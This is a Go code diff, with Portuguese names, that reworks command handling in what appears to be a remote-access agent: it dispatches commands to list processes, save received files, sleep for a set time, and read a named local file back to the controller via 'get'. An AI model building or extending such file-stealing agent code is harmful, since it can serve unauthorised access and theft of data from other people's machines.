@@ -79,8 +79,13 @@ func executaComando(comando string, indice int) (resposta string) {
 		resposta = listaProcessos()
 	case "send":
 		resposta = salvaArquivoEmDisco(mensagem.Comandos[indice].Arquivo)
+	//case "get":
+	//	resposta = enviarArquivo(mensagem.Comandos[indice].Comando, indice)
 	case "get":
-		resposta = enviarArquivo(mensagem.Comandos[indice].Comando, indice)
+		if len(comandoSeparado) > 1 {
+			nomeArquivo := strings.TrimSpace(strings.TrimPrefix(comando, "get"))
+			resposta = enviarArquivo(nomeArquivo, indice)
+		}
 	case "sleep":
 		tempoEspera, _ = strconv.Atoi(strings.TrimSpace(comandoSeparado[1]))
 	default:
@@ -90,17 +95,33 @@ func executaComando(comando string, indice int) (resposta string) {
 	return resposta
 }
 
-func enviarArquivo(comandoGet string, indice int) (resposta string) {
+//func enviarArquivo(comandoGet string, indice int) (resposta string) {
+//	var err error
+//	resposta = "Arquivo enviado com sucesso."
+//	comandoSeparado := helpers.SeparaComando(comandoGet)
+//	fmt.Println("comandoSeparado:", comandoSeparado[1])
+//	mensagem.Comandos[indice].Arquivo.Conteudo, err = ioutil.ReadFile(comandoSeparado[1])
+//	if err != nil {
+//		resposta = "Erro ao copiar o arquivo: " + err.Error()
+//		mensagem.Comandos[indice].Arquivo.Erro = true
+//	}
+//	mensagem.Comandos[indice].Arquivo.Nome = comandoSeparado[1]
+//
+//	return resposta
+//}
+
+func enviarArquivo(nomeArquivo string, indice int) (resposta string) {
 	var err error
-	resposta = "Arquivo enviado com sucesso."
-	comandoSeparado := helpers.SeparaComando(comandoGet)
-	fmt.Println("comandoSeparado:", comandoSeparado[1])
-	mensagem.Comandos[indice].Arquivo.Conteudo, err = ioutil.ReadFile(comandoSeparado[1])
+	resposta = "Arquivo baixado com sucesso!"
+
+	mensagem.Comandos[indice].Arquivo.Conteudo, err = ioutil.ReadFile(nomeArquivo)
+
 	if err != nil {
 		resposta = "Erro ao copiar o arquivo: " + err.Error()
 		mensagem.Comandos[indice].Arquivo.Erro = true
+		return resposta
 	}
-	mensagem.Comandos[indice].Arquivo.Nome = comandoSeparado[1]
+	mensagem.Comandos[indice].Arquivo.Nome = nomeArquivo
 
 	return resposta
 }
